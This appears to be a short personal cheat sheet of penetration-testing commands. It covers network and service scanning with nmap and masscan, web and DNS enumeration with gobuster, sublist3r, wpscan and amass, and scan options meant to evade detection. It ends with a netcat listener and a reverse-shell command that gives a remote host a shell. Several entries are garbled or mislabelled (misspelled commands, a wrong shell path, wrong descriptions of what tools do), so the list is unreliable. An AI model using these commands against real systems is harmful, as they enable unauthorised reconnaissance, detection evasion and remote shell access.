All commands and links i need to sort.  


Recon
Find Vuln
Exploit
Evlate 
Repeat
ZAP better then burp

nmap -sn 192.168.0.1/24 - scans network for all hosts
nmap -sV <ip> - does a service scan on a target ip
nmap --script vuln <ip> - does a quick vulnerability scan on a host
namp -A <ip> - does a deep scan for everything above.
other options -f (fragment, make it harder for detection), --source 53 (make it appear as if coming from dns port), 

masscan 192.168.0.1/24 -p0-65535 --rate=10000 - scans network for all hosts, but fast
masscan 192.168.0.1/24 -p23 --rate=1000 - does a quick scan for all telnet open
other options --randomize-hosts (dont scan in order) 

curl -u http://website - display website header and info

gobuster dir -u http://website -w /usr/share/seclist - enumerates subdirectories
gobuster dns -d http://website -w dns Jhaddix.txt - enumerates subdirectories

sublist3r -d http://website - enumerates subdirectories

wpscan --url http://website --enumerate  u for user, p for plugins, t for themes
wpscan --url http://website --enumerate  vp,vt --plugins-detection aggressive (need api token) 

amass enum -d domain --passive - gives XXXX

nc -lvp 1337
nc -e /bon/sh ip 1337  
